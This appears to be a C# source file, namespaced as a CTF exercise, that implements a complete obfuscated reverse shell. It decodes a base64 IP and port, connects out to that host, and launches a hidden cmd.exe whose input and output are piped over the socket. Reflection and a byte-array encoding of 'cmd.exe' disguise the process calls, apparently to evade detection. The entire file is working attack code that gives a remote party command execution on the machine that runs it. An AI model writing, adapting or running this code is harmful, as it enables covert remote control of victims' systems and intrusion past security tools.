using System;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Reflection;

namespace ReverseShellCTF
{
    class Program
    {
        private static StringBuilder buffer = new StringBuilder();
        private static StreamWriter writer;

        static void Main(string[] args)
        {
            try
            {
                if (args.Length != 2)
                {
                    Console.WriteLine("Usage: NativePayload.exe <base64_ip> <base64_port>");
                    return;
                }

                string ip = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
                int port = int.Parse(Encoding.UTF8.GetString(Convert.FromBase64String(args[1])));

                using (TcpClient client = new TcpClient(ip, port))
                using (NetworkStream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    writer = new StreamWriter(stream);
                    object process = Activator.CreateInstance(Type.GetType("System.Diagnostics.Process"));
                    object startInfo = process.GetType().GetProperty("StartInfo").GetValue(process);

                    string shell = GetShellName();

                    SetProperty(startInfo, "FileName", shell);
                    SetProperty(startInfo, "CreateNoWindow", true);
                    SetProperty(startInfo, "UseShellExecute", false);
                    SetProperty(startInfo, "RedirectStandardOutput", true);
                    SetProperty(startInfo, "RedirectStandardInput", true);
                    SetProperty(startInfo, "RedirectStandardError", true);

                    EventHandler<DataReceivedEventArgs> handler = new EventHandler<DataReceivedEventArgs>(DataReceived);

                    process.GetType().GetEvents()[0].AddEventHandler(process, handler);

                    process.GetType().GetMethod("Start").Invoke(process, null);
                    process.GetType().GetMethod("BeginOutputReadLine").Invoke(process, null);

                    while (true)
                    {
                        string cmd = reader.ReadLine();
                        if (cmd != null)
                        {
                            process.GetType().GetProperty("StandardInput").GetValue(process).GetType().GetMethod("WriteLine").Invoke(
                                process.GetType().GetProperty("StandardInput").GetValue(process), new object[] { cmd });
                        }
                    }
                }
            }
            catch { }
        }

        private static void SetProperty(object obj, string propName, object value)
        {
            obj.GetType().GetProperty(propName).SetValue(obj, value);
        }

        private static string GetShellName()
        {
            // Returns "cmd.exe" from obfuscated characters
            byte[] parts = new byte[] { 99, 109, 100, 46, 101, 120, 101 }; // cmd.exe
            return Encoding.ASCII.GetString(parts);
        }

        private static void DataReceived(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                try
                {
                    writer.WriteLine(e.Data);
                    writer.Flush();
                }
                catch { }
            }
        }
    }
}
